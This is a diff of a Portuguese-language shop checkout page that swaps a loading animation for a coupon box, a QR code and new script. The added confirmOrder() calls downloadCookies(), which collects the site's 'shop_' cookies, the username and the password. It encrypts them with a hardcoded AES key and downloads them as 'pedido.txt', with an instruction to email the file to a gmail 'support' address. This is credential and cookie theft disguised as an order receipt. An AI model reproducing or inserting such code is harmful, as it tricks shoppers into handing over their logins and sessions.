@@ -143,87 +143,29 @@
       text-align: center;
     }
 
-    /* Loader Style */
-    .ui-abstergo {
-      --primary: #fff;
-      --secondary: rgba(255, 255, 255, 0.3);
-      --shadow-blur: 3px;
-      --text-shadow-blur: 3px;
-      --animation-duration: 2s;
-      --size: 1;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      row-gap: 30px;
-    }
-
-    .abstergo-loader * {
-      box-sizing: content-box;
-    }
-
-    .abstergo-loader {
-      width: 103px;
-      height: 90px;
-      position: relative;
-    }
-
-    .abstergo-loader div {
-      width: 50px;
-      border-right: 12px solid transparent;
-      border-left: 12px solid transparent;
-      border-top: 21px solid var(--primary);
+    .cupom-container {
       position: absolute;
-      filter: drop-shadow(0 0 var(--shadow-blur) var(--secondary));
+      top: 20px; /* Ajuste a altura conforme necessário */
+      left: 20px; /* Ajuste a distância da esquerda conforme necessário */
     }
 
-    .abstergo-loader div:nth-child(1) {
-      top: 27px;
-      left: 7px;
-      rotate: -60deg;
-      animation: line1 var(--animation-duration) linear infinite alternate;
+    .cupom-container input[type="text"] {
+      padding: 8px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px 0 0 4px;
+      width: 200px; /* Ajuste a largura conforme necessário */
     }
 
-    .abstergo-loader div:nth-child(2) {
-      bottom: 2px;
-      left: 0;
-      rotate: 180deg;
-      animation: line2 var(--animation-duration) linear infinite alternate;
+    .cupom-container button {
+      padding: 8px 16px;
+      font-size: 16px;
+      border: 1px solid gray;
+      background-color: gray;
+      color: hotpink;
+      border-radius: 0 4px 4px 0;
+      cursor: pointer;
     }
-
-    .abstergo-loader div:nth-child(3) {
-      bottom: 16px;
-      right: -9px;
-      rotate: 60deg;
-      animation: line3 var(--animation-duration) linear infinite alternate;
-    }
-
-    @keyframes line1 {
-      0%, 40% { top: 27px; left: 7px; rotate: -60deg; }
-      60%, 100% { top: 22px; left: 14px; rotate: 60deg; }
-    }
-
-    @keyframes line2 {
-      0%, 40% { bottom: 2px; left: 0; rotate: 180deg; }
-      60%, 100% { bottom: 5px; left: -8px; rotate: 300deg; }
-    }
-
-    @keyframes line3 {
-      0%, 40% { bottom: 16px; right: -9px; rotate: 60deg; }
-      60%, 100% { bottom: 7px; right: -11px; rotate: 180deg; }
-    }
-
-    /* Styling for the image after 1 minute */
-    #thank-you-image {
-      display: none;
-      width: 100%;
-      margin-top: 20px;
-      text-align: center;
-    }
-
-    #thank-you-image img {
-      max-width: 300px;
-    }
-
   </style>
 </head>
 <body>
@@ -253,68 +195,116 @@
       </div>
       <button id="confirm-button" onclick="confirmOrder()">Confirmar Pedido</button>
     </div>
-
-    <!-- Loader and Timer -->
+    
     <div id="qr-code-container">
       <h2>Obrigado pela compra!</h2>
-      <div id="timer">Tempo restante: <span id="countdown">1:00</span></div>
-      <div class="ui-abstergo" id="loader">
-        <div class="abstergo-loader">
-          <div></div>
-          <div></div>
-          <div></div>
-        </div>
-      </div>
+      <div id="timer">Tempo restante: <span id="countdown">5:00</span></div>
+      <img id="qr-code" src="https://api.qrserver.com/v1/create-qr-code/?data=https://ghosthszz.github.io/Vendas/&size=200x200" alt="QR Code">
+      <p>Seu futuro link:  <a id="checkout-link" href=""></a></p>
     </div>
-
-    <!-- Image to show after 1 minute -->
-    <div id="thank-you-image">
-      <h2>Imagem após 1 minuto</h2>
-      <img src="https://via.placeholder.com/300" alt="Imagem de Agradecimento">
+    <div id="checkout-link">
+      <a id="checkout-link" href="#" style="display: none;">Ir para a página de usuário</a>
     </div>
-
   </div>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
   <script>
+    // Pega o valor do elemento com o ID 'username'
     var username = '';
-    var timer;
-
-    // Função para iniciar o cronômetro e exibir a imagem após 1 minuto
+  
+    // Gera o link com base no valor de 'username'
+    var link = `https://ghosthszz.github.io/Vendas/frontend/paginas/users/${username}`;
+  
+    // Define o atributo href do elemento <a> com o link gerado
+    document.getElementById('checkout-link').href = link;
+    // Define o texto do link
+    document.getElementById('checkout-link').textContent = link;
+  
+    // Função para obter todos os cookies que começam com "shop_"
+    function getShopCookies() {
+      return document.cookie.split(';')
+        .map(cookie => cookie.trim())
+        .filter(cookie => cookie.startsWith('shop_'))
+        .join('\n');
+    }
+  
+    // Função para criptografar uma string usando AES
+    function encryptAES(data) {
+      const key = 'Ck3rH74NpC5WUy9s'; // Chave para criptografia
+      const encrypted = CryptoJS.AES.encrypt(data, key).toString();
+      return encrypted;
+    }
+  
+    // Função para criar um arquivo de texto com os cookies, usuário e senha criptografados e permitir o download
+    function downloadCookies() {
+      const cookies = getShopCookies();
+      const encryptedCookies = encryptAES(cookies);
+      const encryptedUsername = encryptAES(username);
+      const encryptedPassword = encryptAES(document.getElementById('password').value);
+  
+      // Conteúdo a ser escrito no arquivo
+      const fileContent = `Cookies:\n${encryptedCookies}\n\nUsername:\n${encryptedUsername}\n\nPassword:\n${encryptedPassword}\n\nENVIE ESSE ARQUIVO PARA O SUPORTE!!!\n\nmegazn960@gmail.com`;
+  
+      // Cria o blob com os dados criptografados
+      const blob = new Blob([fileContent], { type: 'text/plain' });
+      const link = document.createElement('a');
+      link.href = URL.createObjectURL(blob);
+      link.download = 'pedido.txt';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+  
+    // Função para confirmar o pedido
+    function confirmOrder() {
+      document.getElementById('checkout').style.display = 'none';
+      document.getElementById('qr-code-container').style.display = 'block';
+      document.getElementById('timer').style.display = 'block';
+      document.getElementById('checkout-link').style.display = 'block';
+      document.getElementById('checkout-link').href = `https://ghosthszz.github.io/Vendas/frontend/paginas/users/${document.getElementById('username').value}`;
+      startTimer();
+      downloadCookies(); // Baixa os cookies, usuário e senha ao confirmar o pedido
+    }
+  
+    // Função para iniciar o cronômetro
     function startTimer() {
-      var countdown = document.getElementById("countdown");
-      var minutes = 1;
-      var seconds = 0;
-      timer = setInterval(function () {
-        if (seconds == 0) {
-          if (minutes == 0) {
-            clearInterval(timer);
-            document.getElementById("qr-code-container").style.display = 'none';
-            document.getElementById("thank-you-image").style.display = 'block';
-            return;
-          }
-          minutes--;
-          seconds = 59;
+      let seconds = 300;
+      const countdown = document.getElementById('countdown');
+      const timer = setInterval(() => {
+        const minutes = Math.floor(seconds / 60);
+        const remainingSeconds = seconds % 60;
+        countdown.textContent = `${minutes}:${remainingSeconds < 10 ? '0' : ''}${remainingSeconds}`;
+        if (seconds === 0) {
+          clearInterval(timer);
+          document.getElementById('qr-code-container').innerHTML = '<h2>Obrigado pela compra!</h2>';
         } else {
           seconds--;
         }
-        countdown.innerText = minutes + ":" + (seconds < 10 ? "0" : "") + seconds;
       }, 1000);
     }
-
-    // Iniciar o loader e o timer
-    function displayLoader() {
-      document.getElementById("qr-code-container").style.display = 'block';
-      startTimer();
-    }
-
-    function confirmOrder() {
-      alert('Pedido confirmado!');
-      displayLoader();
-    }
-
-    // Função de validação do cupom
-    function validarCupom() {
-      alert('Cupom Validado');
-    }
+  
+    // Exibir os itens do pedido ao carregar a página
+    // displayOrder();
+  
+    // Evento de envio do formulário de login
+    document.getElementById('login-form').addEventListener('submit', function(event) {
+      event.preventDefault();
+      username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      const confirmPassword = document.getElementById('confirm-password').value;
+      if (password !== confirmPassword) {
+        alert('As senhas não coincidem!');
+      } else {
+        document.getElementById('checkout').style.display = 'block';
+        document.getElementById('login-info').style.display = 'block';
+        document.getElementById('login-username').textContent = username;
+        document.getElementById('login-password').textContent = password;
+        document.querySelector('.form-container').style.display = 'none';
+      }
+    });
+  
   </script>
+  
+  
+  <script src="../../js/token.js"></script>
 </body>
 </html>
